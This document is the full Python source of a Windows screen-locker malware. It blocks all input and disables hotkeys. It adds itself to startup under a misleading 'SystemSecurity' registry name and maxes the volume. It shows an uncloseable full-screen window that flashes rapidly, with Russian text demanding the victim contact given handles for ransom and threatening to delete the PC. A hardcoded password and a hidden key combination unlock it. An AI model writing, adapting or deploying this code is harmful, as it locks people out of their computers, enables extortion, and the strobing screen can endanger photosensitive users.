import sys
import platform
import os
import tkinter as tk
import ctypes
import keyboard
import winreg
import getpass

kernel32 = ctypes.windll.kernel32
user32 = ctypes.windll.user32
user32.BlockInput(True)

def set_max_volume():
    try:
        from pycaw.pycaw import AudioUtilities, ISimpleAudioVolume
        sessions = AudioUtilities.GetAllSessions()
        for session in sessions:
            volume = session._ctl.QueryInterface(ISimpleAudioVolume)
            volume.SetMasterVolume(1.0, None)
    except ImportError:
        pass

set_max_volume()

def add_to_startup():
    try:
        username = getpass.getuser()
        script_path = os.path.abspath(sys.argv[0])
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "SystemSecurity", 0, winreg.REG_SZ, f'"{sys.executable}" "{script_path}"')
        winreg.CloseKey(key)
    except:
        pass

add_to_startup()

root = tk.Tk()
root.attributes("-fullscreen", True)
root.attributes("-topmost", True)
root.overrideredirect(True)
root.protocol("WM_DELETE_WINDOW", lambda: None)
root.config(cursor="none")

keyboard.block_key('win')

main_label = tk.Label(
    root, 
    text="ЭТО ДЫРАНОН, ТВОЙ ПК БЫЛ ЗАХВАЧЕН\nДЛЯ ОТКУПА ПИСАТЬ @PathfinderL/@xarmanov\nИЛИ СМЕРТЬ\n\nкстати если введёшь неверный пароль то твой пк будет удалён!)))0)0)))",
    font=("Arial", 30), 
    justify="center"
)
main_label.pack(pady=50)

password_label = tk.Label(
    root,
    text="введите пароль:",
    font=("Arial", 14),
    justify="center"
)
password_label.pack()

password_entry = tk.Entry(
    root,
    font=("Arial", 20),
    show="*",
    width=20,
    justify="center"
)
password_entry.pack(pady=10)
password_entry.focus_set()

is_black = True
def flash_background():
    global is_black
    if is_black:
        root.config(bg="white")
        main_label.config(bg="white", fg="black")
        password_label.config(bg="white", fg="black")
        password_entry.config(bg="white", fg="black")
    else:
        root.config(bg="black")
        main_label.config(bg="black", fg="red")
        password_label.config(bg="black", fg="white")
        password_entry.config(bg="black", fg="white")
    is_black = not is_black
    root.after(50, flash_background)

flash_background()

def check_password(event=None):
    if password_entry.get() == "666":
        user32.BlockInput(False)
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, "SystemSecurity")
            winreg.CloseKey(key)
        except:
            pass
        root.quit()
        os._exit(0)
    else:
        password_entry.delete(0, tk.END)
        password_entry.config(bg="darkred")

password_entry.bind("<Return>", check_password)

def block_all_keys(event):
    if event.keysym == "F12" and event.state == 28:
        user32.BlockInput(False)
        root.quit()
        os._exit(0)
    return "break"

root.bind("<KeyPress>", block_all_keys)
root.bind("<KeyRelease>", block_all_keys)

def disable_hotkeys():
    user32.SystemParametersInfoW(0x0057, 0, None, 0)

disable_hotkeys()

try:
    root.mainloop()
finally:
    user32.BlockInput(False)